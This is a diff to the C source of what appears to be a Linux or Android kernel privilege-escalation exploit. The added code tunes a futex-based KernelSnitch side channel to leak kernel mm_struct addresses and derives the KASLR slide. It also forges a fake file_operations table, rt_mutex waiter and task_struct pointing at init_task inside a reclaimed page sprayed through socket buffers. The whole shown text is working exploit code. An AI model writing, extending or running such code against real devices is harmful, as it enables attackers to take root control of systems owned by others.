@@ -206,6 +206,43 @@ _Static_assert(
     APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
     "mirrored FOPS table overlaps primary FOPS table");
 #endif
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+_Static_assert(
+    APP_REUSED_FOPS_FOPS_OFF >= APP_REUSED_FOPS_PAGE_SOURCE_OFF +
+                                    APP_REUSED_FOPS_PAGE_PRESERVE,
+               "reused FOPS table starts before writable page");
+_Static_assert(
+    APP_REUSED_FOPS_FOPS_OFF + FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) <=
+        APP_REUSED_FOPS_PAGE_SOURCE_OFF + PAGE_SIZE,
+    "reused FOPS table exceeds writable page");
+_Static_assert(
+    APP_REUSED_FOPS_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
+        APP_REUSED_FOPS_PAGE_SOURCE_OFF + PAGE_SIZE,
+    "reused waiter exceeds writable page");
+_Static_assert(
+    APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF +
+            sizeof(uint64_t) <=
+        APP_REUSED_FOPS_PAGE_SOURCE_OFF + PAGE_SIZE,
+    "reused task exceeds writable page");
+_Static_assert(
+    APP_REUSED_FOPS_SCRATCH_OFF >= APP_REUSED_FOPS_PAGE_SOURCE_OFF +
+                                      APP_REUSED_FOPS_PAGE_PRESERVE &&
+        APP_REUSED_FOPS_SCRATCH_OFF + 64 <=
+            APP_REUSED_FOPS_PAGE_SOURCE_OFF + PAGE_SIZE,
+    "reused scratch lies outside writable page");
+_Static_assert(
+    APP_REUSED_FOPS_FOPS_OFF + FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) <=
+        APP_REUSED_FOPS_RIGHT_OFF &&
+        APP_REUSED_FOPS_RIGHT_OFF + 0x18 <= APP_REUSED_FOPS_LEFT_OFF &&
+        APP_REUSED_FOPS_LEFT_OFF + 0x18 <= APP_REUSED_FOPS_LOCK_OFF &&
+        APP_REUSED_FOPS_LOCK_OFF + 0x20 <= APP_REUSED_FOPS_WAITER_OFF &&
+        APP_REUSED_FOPS_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
+            APP_REUSED_FOPS_TASK_OFF &&
+        APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF +
+                sizeof(uint64_t) <= APP_REUSED_FOPS_SCRATCH_OFF,
+    "reused FOPS objects overlap");
+#endif
 
 static int configure_slide_bank_geometry(uintptr_t leaked,
                                          int payload_mode) {
@@ -293,6 +330,7 @@ int fops_data_probe_active;
 int data_alias_uses_slide = 1;
 #endif
 int data_addr_canonical;
+int app_fops_reused_page_ready;
 char ashmem_path[256] = "/dev/ashmem";
 
 __attribute__((weak)) void app_publish_writer_started(void) {
@@ -888,11 +926,70 @@ int clone_memfd(void) {
 
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
+#ifndef CONTROLLED_KSNITCH_APPENDED_FUTEXES
+#define CONTROLLED_KSNITCH_APPENDED_FUTEXES 256
+#endif
+#ifndef CONTROLLED_KSNITCH_REPEAT_MEASUREMENT
+#define CONTROLLED_KSNITCH_REPEAT_MEASUREMENT REPEAT_MEASUREMENT
+#endif
+#ifndef CONTROLLED_KSNITCH_AVERAGE
+#define CONTROLLED_KSNITCH_AVERAGE AVERAGE
+#endif
+#ifndef CONTROLLED_KSNITCH_FAST_APPENDED_FUTEXES
+#define CONTROLLED_KSNITCH_FAST_APPENDED_FUTEXES \
+  CONTROLLED_KSNITCH_APPENDED_FUTEXES
+#endif
+#ifndef CONTROLLED_KSNITCH_FAST_REPEAT_MEASUREMENT
+#define CONTROLLED_KSNITCH_FAST_REPEAT_MEASUREMENT \
+  CONTROLLED_KSNITCH_REPEAT_MEASUREMENT
+#endif
+#ifndef CONTROLLED_KSNITCH_FAST_AVERAGE
+#define CONTROLLED_KSNITCH_FAST_AVERAGE CONTROLLED_KSNITCH_AVERAGE
+#endif
+
 enum controlled_mm_zone {
   CONTROLLED_MM_INVALID,
   CONTROLLED_MM_DMA32,
   CONTROLLED_MM_NORMAL,
 };
+
+static int controlled_fast_profile_enabled(void) {
+#if defined(APP_CONTROLLED_FAST_KSNITCH) && \
+    APP_CONTROLLED_FAST_KSNITCH
+  const char *value = getenv("RMG_CONTROLLED_FAST");
+
+  if (value && *value) {
+    return strcmp(value, "0") != 0;
+  }
+#if defined(APP_CONTROLLED_FAST_KSNITCH_DEFAULT)
+  return APP_CONTROLLED_FAST_KSNITCH_DEFAULT != 0;
+#else
+  return 1;
+#endif
+#else
+  return 0;
+#endif
+}
+
+static void configure_controlled_kernelsnitch_profile(
+    struct kernelsnitch_shared_state *state, int fast, uintptr_t hint,
+    size_t collisions) {
+  size_t appended_futexes = CONTROLLED_KSNITCH_APPENDED_FUTEXES;
+  size_t repeat_measurement = CONTROLLED_KSNITCH_REPEAT_MEASUREMENT;
+  size_t average = CONTROLLED_KSNITCH_AVERAGE;
+
+  if (fast) {
+    appended_futexes = CONTROLLED_KSNITCH_FAST_APPENDED_FUTEXES;
+    repeat_measurement = CONTROLLED_KSNITCH_FAST_REPEAT_MEASUREMENT;
+    average = CONTROLLED_KSNITCH_FAST_AVERAGE;
+  }
+  kernelsnitch_set_profile(state, appended_futexes, repeat_measurement,
+                           average);
+  pr_info("controlled KernelSnitch profile fast=%d hint=%d collisions=%zu "
+          "appended=%zu repeat=%zu average=%zu\n",
+          fast, hint != 0, collisions, appended_futexes,
+          repeat_measurement, average);
+}
 
 static pid_t clone_controlled_leak_child(
     struct kernelsnitch_shared_state *state) {
@@ -1077,88 +1174,95 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
   size_t collisions = hint ? S918_KSNITCH_HINT_COLLISIONS
                            : S918_KSNITCH_FULL_COLLISIONS;
   size_t passes = hint ? 2 : 1;
+  int fast_enabled = controlled_fast_profile_enabled();
 
   *hint_hit = 0;
   for (size_t pass = 0; pass < passes; ++pass) {
-    struct kernelsnitch_shared_state *state = kernelsnitch_setup(
-        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
-    pid_t child;
-    int fd;
-    int status;
+    size_t profile_count = fast_enabled ? 2 : 1;
 
-    if (!state) {
-      return -1;
-    }
-    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
-#ifdef QEMU_MM_TRACE_VALIDATE
-    uintptr_t oracle_mm = 0;
-    if (!qemu_mm_trace_drain()) {
-      state->state = KERNELSNITCH_MM_NOT_FOUND;
-      kernelsnitch_cleanup(state);
-      return -1;
-    }
-#endif
-    child = clone_controlled_leak_child(state);
-    fd = open_memfd(child);
-    int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
-                   !WEXITSTATUS(status) &&
-                   kernelsnitch_found_collisions(state);
-#ifdef QEMU_MM_TRACE_VALIDATE
-    int oracle_ok = qemu_mm_trace_read(&oracle_mm);
-    if (!child_ok) {
-      pr_info("qemu mm validate collision=0 actual=%016zx trace=%d\n",
-              oracle_mm, oracle_ok);
-    }
-#endif
-    if (!child_ok) {
-      close(fd);
-      state->state = KERNELSNITCH_MM_NOT_FOUND;
-      kernelsnitch_cleanup(state);
-      if (current_hint) {
-        current_hint = 0;
-        collisions = S918_KSNITCH_FULL_COLLISIONS;
-        continue;
+    for (size_t profile = 0; profile < profile_count; ++profile) {
+      int fast = fast_enabled && profile == 0;
+      struct kernelsnitch_shared_state *state = kernelsnitch_setup(
+          MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
+      pid_t child;
+      int fd;
+      int status;
+
+      if (!state) {
+        return -1;
       }
-      return -2;
-    }
-    if (current_hint) {
-      state->mm_struct = controlled_mm_match_page(state, current_hint);
-      if (state->mm_struct == (uintptr_t)-1) {
+      configure_controlled_kernelsnitch_profile(
+          state, fast, current_hint, collisions);
+#ifdef QEMU_MM_TRACE_VALIDATE
+      uintptr_t oracle_mm = 0;
+      if (!qemu_mm_trace_drain()) {
+        state->state = KERNELSNITCH_MM_NOT_FOUND;
+        kernelsnitch_cleanup(state);
+        return -1;
+      }
+#endif
+      child = clone_controlled_leak_child(state);
+      fd = open_memfd(child);
+      int child_ok = waitpid(child, &status, 0) == child &&
+                     WIFEXITED(status) && !WEXITSTATUS(status) &&
+                     kernelsnitch_found_collisions(state);
+#ifdef QEMU_MM_TRACE_VALIDATE
+      int oracle_ok = qemu_mm_trace_read(&oracle_mm);
+      if (!child_ok) {
+        pr_info("qemu mm validate collision=0 actual=%016zx trace=%d\n",
+                oracle_mm, oracle_ok);
+      }
+#endif
+      if (!child_ok) {
         close(fd);
         state->state = KERNELSNITCH_MM_NOT_FOUND;
         kernelsnitch_cleanup(state);
-        current_hint = 0;
-        collisions = S918_KSNITCH_FULL_COLLISIONS;
         continue;
       }
-      state->found = 1;
-      state->state = KERNELSNITCH_MM_FOUND;
-      *hint_hit = 1;
-    } else {
-      kernelsnitch_bruteforce(state);
-    }
-    if (state->mm_struct == (uintptr_t)-1) {
-      close(fd);
-      kernelsnitch_cleanup(state);
-      return -2;
-    }
-    *mm_out = state->mm_struct;
+      if (current_hint) {
+        state->mm_struct = controlled_mm_match_page(state, current_hint);
+        if (state->mm_struct == (uintptr_t)-1) {
+          close(fd);
+          state->state = KERNELSNITCH_MM_NOT_FOUND;
+          kernelsnitch_cleanup(state);
+          continue;
+        }
+        state->found = 1;
+        state->state = KERNELSNITCH_MM_FOUND;
+        *hint_hit = 1;
+      } else {
+        kernelsnitch_bruteforce(state);
+      }
+      if (state->mm_struct == (uintptr_t)-1) {
+        close(fd);
+        kernelsnitch_cleanup(state);
+        continue;
+      }
+      *mm_out = state->mm_struct;
 #ifdef QEMU_MM_TRACE_VALIDATE
-    pr_info("qemu mm validate ks=%016zx actual=%016zx exact=%d page=%d "
-            "hint=%d\n",
-            *mm_out, oracle_mm, oracle_ok && *mm_out == oracle_mm,
-            oracle_ok && ((*mm_out & ~(ORDER3_SIZE - 1)) ==
-                          (oracle_mm & ~(ORDER3_SIZE - 1))),
-            *hint_hit);
-    if (!oracle_ok || *mm_out != oracle_mm) {
-      close(fd);
-      state->state = KERNELSNITCH_MM_NOT_FOUND;
-      kernelsnitch_cleanup(state);
-      return -2;
-    }
+      pr_info("qemu mm validate ks=%016zx actual=%016zx exact=%d page=%d "
+              "hint=%d\n",
+              *mm_out, oracle_mm, oracle_ok && *mm_out == oracle_mm,
+              oracle_ok && ((*mm_out & ~(ORDER3_SIZE - 1)) ==
+                            (oracle_mm & ~(ORDER3_SIZE - 1))),
+              *hint_hit);
+      if (!oracle_ok || *mm_out != oracle_mm) {
+        close(fd);
+        state->state = KERNELSNITCH_MM_NOT_FOUND;
+        kernelsnitch_cleanup(state);
+        *hint_hit = 0;
+        continue;
+      }
 #endif
-    kernelsnitch_cleanup(state);
-    return fd;
+      kernelsnitch_cleanup(state);
+      return fd;
+    }
+    if (current_hint) {
+      current_hint = 0;
+      collisions = S918_KSNITCH_FULL_COLLISIONS;
+      continue;
+    }
+    return -2;
   }
   return -2;
 #endif
@@ -1657,9 +1761,19 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
           parent = p0_gate_page_struct;
           target = 0;
-        } else {
+        } else if (slot == P0_ORACLE_PROBE_RESTORE_SLOT) {
           parent = p0_probe_page_struct;
           target = 0;
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+        } else if (slot == P0_ORACLE_PRODUCTION_SLOT) {
+          parent = p0_gate_page_struct;
+          target = pipebuf_page_base +
+                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+                   2 * sizeof(struct user_pipe_buffer);
+#endif
+        } else {
+          return 0;
         }
 #else
         uintptr_t offset = slide_bank_offsets[slot];
@@ -1905,6 +2019,81 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   }
   return 1;
 }
+
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+int prepare_reused_fops_payload(uintptr_t runtime_slide) {
+  if (!skb_buf || !is_direct_ptr(page_base) ||
+      runtime_slide > 0x3f8000ULL || (runtime_slide & 0x7fffULL) != 0) {
+    return 0;
+  }
+  kaslr_base = KIMAGE_TEXT_BASE + runtime_slide;
+  kaslr_slide = runtime_slide;
+  slide_p0_offset = runtime_slide;
+  kaslr_done = 1;
+  data_addr_canonical = 0;
+  memset(skb_buf, 0, SKB_SEND_SIZE);
+
+  uintptr_t payload_base = page_base + SKB_DATA_DELTA;
+  if (payload_base + APP_REUSED_FOPS_PAGE_SOURCE_OFF != page_base) {
+    pr_warning("reused FOPS payload delta mismatch base=%016zx payload=%016zx "
+               "source=0x%x\n",
+               page_base, payload_base, APP_REUSED_FOPS_PAGE_SOURCE_OFF);
+    return 0;
+  }
+  unsigned char *p = skb_buf + SKB_FRAG_BIAS;
+  fake_fops = payload_base + APP_REUSED_FOPS_FOPS_OFF;
+  fake_lock = payload_base + APP_REUSED_FOPS_LOCK_OFF;
+  fake_w0 = payload_base + APP_REUSED_FOPS_WAITER_OFF;
+  fake_task = payload_base + APP_REUSED_FOPS_TASK_OFF;
+  fake_parent = fake_fops;
+  fake_right = data_addr(ASHMEM_MISC_FOPS);
+  fake_left = 0;
+  binwrite_target = payload_base + APP_REUSED_FOPS_SCRATCH_OFF;
+  slide_oracle_parent = fake_fops;
+  slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+
+  put32(p, APP_REUSED_FOPS_LOCK_OFF + 0x00, 0);
+  put64(p, APP_REUSED_FOPS_LOCK_OFF + 0x08, fake_w0);
+  put64(p, APP_REUSED_FOPS_LOCK_OFF + 0x10, fake_w0);
+  put64(p, APP_REUSED_FOPS_LOCK_OFF + 0x18, fake_task | 1);
+  put_fake_waiter(
+      p, APP_REUSED_FOPS_WAITER_OFF, 1, 0, 0, fake_fops,
+      data_addr(ASHMEM_MISC_FOPS), 0, text_addr(INIT_TASK), fake_lock,
+      FAKE_WAITER_PRIO);
+
+  put32(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
+  put32(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+  put32(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF,
+        FAKE_TASK_PRIO);
+  put32(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+  put64(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+  put64(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+  put64(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF,
+        text_addr(ROOT_TASK_GROUP));
+  put64(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
+        text_addr(INIT_TASK));
+  put64(p, APP_REUSED_FOPS_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+
+  put64(p, APP_REUSED_FOPS_RIGHT_OFF + 0x00, fake_parent);
+  put64(p, APP_REUSED_FOPS_RIGHT_OFF + 0x08, 0);
+  put64(p, APP_REUSED_FOPS_RIGHT_OFF + 0x10, 0);
+  put64(p, APP_REUSED_FOPS_LEFT_OFF + 0x00, fake_parent);
+  put64(p, APP_REUSED_FOPS_LEFT_OFF + 0x08, 0);
+  put64(p, APP_REUSED_FOPS_LEFT_OFF + 0x10, 0);
+  put_fake_fops_table(p, APP_REUSED_FOPS_FOPS_OFF);
+  return 1;
+}
+
+int rewrite_reused_fops_payload(void) {
+  if (!skb_buf) {
+    return 0;
+  }
+  return rewrite_p0_payload_page(
+      skb_buf + SKB_FRAG_BIAS + APP_REUSED_FOPS_PAGE_SOURCE_OFF,
+      PAGE_SIZE);
+}
+#endif
 
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
